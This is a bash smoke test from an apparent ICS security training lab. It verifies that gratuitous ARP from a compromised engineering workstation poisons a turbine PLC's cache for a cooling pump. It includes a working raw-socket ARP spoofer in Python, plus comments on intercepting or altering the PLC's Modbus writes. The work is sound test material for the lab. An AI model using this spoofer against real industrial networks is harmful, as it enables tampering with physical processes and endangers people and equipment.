#!/usr/bin/env bash
# L2 surface probe, inner-zone variant. After compromising eng-ws (the dual-
# homed pivot on operational + control), a visitor sits on the same bridge
# as the turbine PLC, the IEDs, and the actuators. ics_control is a real
# Linux bridge so the same gratuitous-ARP trick that works on ics_internet
# also works here, against OT equipment.
#
# Coverage:
#   Stage 1  PLC's ARP cache holds the actuator's real MAC at start
#   Stage 2  gratuitous ARP from eng-ws rewrites the PLC's cache
#   Stage 3  corrective ARP restores the real mapping (test cleanup)
#
# Realistic next step (not asserted): the PLC writes HR[2] of the cooling
# pump every second per the lab's process simulation. With the cache
# poisoned, those writes land on eng-ws first and a visitor can drop,
# modify, or relay them. Demonstrating the modbus replay would burn
# conntrack state that affects other tests.
#
# eng-ws ships with python3 but no scapy (lab containers never carry
# test-only deps). The ARP frame is built with the stdlib socket module.
#
# Usage: bash tests/smoke/test_arp_poisoning_control_zone.sh
set -uo pipefail

REPO="$(cd "$(dirname "$0")/../.." && pwd)"
source "$REPO/tests/smoke/lib.sh"

PIVOT="uupl-eng-ws"
PIVOT_IFACE="eth2"              # eng-ws control NIC
VICTIM="hex-turbine-plc"
VICTIM_NEIGH_IFACE="eth1"
SPOOFED_IP="10.10.3.52"          # uupl-cooling-pump
SPOOFED_CONTAINER="uupl-cooling-pump"
SPOOFED_REAL_IFACE="eth1"

require_running "$PIVOT"
require_running "$VICTIM"
require_running "$SPOOFED_CONTAINER"

# Read MACs at runtime so the test survives a clab redeploy with fresh MACs.
PIVOT_MAC="$(docker exec "$PIVOT" sh -c "cat /sys/class/net/${PIVOT_IFACE}/address" | tr -d '\r\n')"
REAL_MAC="$(docker exec "$SPOOFED_CONTAINER" sh -c "cat /sys/class/net/${SPOOFED_REAL_IFACE}/address" | tr -d '\r\n')"
[ -n "$PIVOT_MAC" ] || fail "could not read $PIVOT MAC"
[ -n "$REAL_MAC" ]  || fail "could not read $SPOOFED_CONTAINER MAC"

# stdlib ARP send. Builds an Ethernet+ARP frame and writes it directly to
# AF_PACKET. PLC's cache updates on receipt; no extra packages needed.
ARP_PY='
import socket, struct, sys
iface, src_mac, claimed_ip, victim_ip = sys.argv[1:5]
def mac2bytes(m): return bytes(int(x, 16) for x in m.split(":"))
def ip2bytes(i):  return socket.inet_aton(i)
eth = mac2bytes("ff:ff:ff:ff:ff:ff") + mac2bytes(src_mac) + b"\x08\x06"
arp = (
    b"\x00\x01"          # hwtype Ethernet
    b"\x08\x00"          # protocol IPv4
    b"\x06"              # hwlen
    b"\x04"              # protolen
    b"\x00\x02"          # op = reply
    + mac2bytes(src_mac) + ip2bytes(claimed_ip)
    + mac2bytes("ff:ff:ff:ff:ff:ff") + ip2bytes(victim_ip)
)
s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0806))
s.bind((iface, 0))
for _ in range(3):
    s.send(eth + arp)
'

# Stage 0 prep: warm PLC ARP cache for the spoofed IP if needed.
PRE="$(docker exec "$VICTIM" ip neigh show "$SPOOFED_IP" dev "$VICTIM_NEIGH_IFACE" 2>&1)"
if [ -z "$PRE" ]; then
    echo "[arp2] (warming PLC cache for $SPOOFED_IP)"
    # The PLC writes HR[2] to the cooling pump every second per the lab's
    # process loop; the entry should be there. If it isn't, force a resolution
    # by having the actuator nudge the PLC, which adds it bidirectionally.
    docker exec "$SPOOFED_CONTAINER" sh -c \
        "python3 -c \"import socket; s=socket.socket(); s.settimeout(1);
try: s.connect(('10.10.3.21', 502))
except Exception: pass\"" >/dev/null 2>&1 || true
    sleep 1
    PRE="$(docker exec "$VICTIM" ip neigh show "$SPOOFED_IP" dev "$VICTIM_NEIGH_IFACE" 2>&1)"
fi

echo "[arp2] Stage 1: PLC ARP cache holds the actuator's real MAC"
assert_contains "$PRE" "$REAL_MAC" "$SPOOFED_IP maps to real actuator MAC before attack"

echo "[arp2] Stage 2: gratuitous ARP from eng-ws rewrites the cache"
docker exec "$PIVOT" python3 -c "$ARP_PY" "$PIVOT_IFACE" "$PIVOT_MAC" "$SPOOFED_IP" 10.10.3.21 \
    >/dev/null 2>&1 || fail "stdlib ARP send from $PIVOT failed"
sleep 1
POISONED="$(docker exec "$VICTIM" ip neigh show "$SPOOFED_IP" dev "$VICTIM_NEIGH_IFACE" 2>&1)"
assert_contains "$POISONED" "$PIVOT_MAC" "$SPOOFED_IP maps to eng-ws MAC after poison"
assert_absent  "$POISONED" "$REAL_MAC"  "real actuator MAC no longer in PLC cache"

echo "[arp2] Stage 3: cleanup restores the real mapping"
# Linux's neighbour subsystem dampens updates to entries it just changed,
# so an attacker-sourced corrective ARP is unreliable within seconds of the
# poison. For test hygiene we flush the entry inside the victim and let the
# PLC's normal poll (HR[2] write to the actuator every second) re-resolve
# from the actual cooling pump. This step is test cleanup, not part of the
# visitor narrative; an attacker would just leave the cache poisoned.
docker exec "$VICTIM" ip neigh del "$SPOOFED_IP" dev "$VICTIM_NEIGH_IFACE" \
    >/dev/null 2>&1 || true
sleep 3
POST="$(docker exec "$VICTIM" ip neigh show "$SPOOFED_IP" dev "$VICTIM_NEIGH_IFACE" 2>&1)"
assert_contains "$POST" "$REAL_MAC" "$SPOOFED_IP maps back to real actuator MAC after flush"

summary
